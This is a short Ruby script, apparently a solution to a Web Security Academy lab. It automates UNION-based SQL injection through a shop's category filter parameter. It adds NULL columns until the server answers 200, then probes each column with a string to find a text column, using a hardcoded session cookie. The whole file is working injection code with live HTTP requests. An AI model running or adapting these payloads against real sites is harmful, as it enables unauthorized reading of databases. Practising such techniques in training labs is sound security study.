require 'http'
 
cols = []
temp = []
status=500

client = HTTP.headers(
		"User-Agent"=>"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36"
).cookies(
		"session" => "9Ba5L6MF0BF6adSsxJmRf6TY3RQ11oxu"
)

# Get the number of columns
def get_status(cols) 
	url = "https://0ab80040040a7b2981549394008200c2.web-security-academy.net/filter"
	payload = "Gifts' UNION SELECT #{cols.join(',')}-- -"
	client = HTTP.get url,:params => {"category"=>"#{payload}"}
	return client.status
end

until status==200
	cols << "NULL"
	status=get_status(cols)
	print "Columns : #{cols.length}"
	puts " : #{status}"
end

puts "Number of columns: #{cols.length}"
# Identify the text based column
# 'UNION SELECT 'str',NULL,NULL-- -
# 'UNION SELECT NULL,'str',NULL-- -
# 'UNION SELECT NULL,NULL,'str'-- -

# Create an array with payloads as each element based upon the number of columns received
temp = cols
payload_array = []
cols.length.times do |e|
	temp[e]="\'a\'"
	temp[e-1]="NULL"	
	payload_array << temp.join(',')
end

payload_array.length.times do |p|
	url = "https://0ab80040040a7b2981549394008200c2.web-security-academy.net/filter"
	payload = "Gifts' UNION SELECT #{payload_array[p]}-- -"
	client = HTTP.get url,:params => {"category"=>"#{payload}"}
	if client.status==200
		puts "Text based column number: #{p+1}"
	end
end








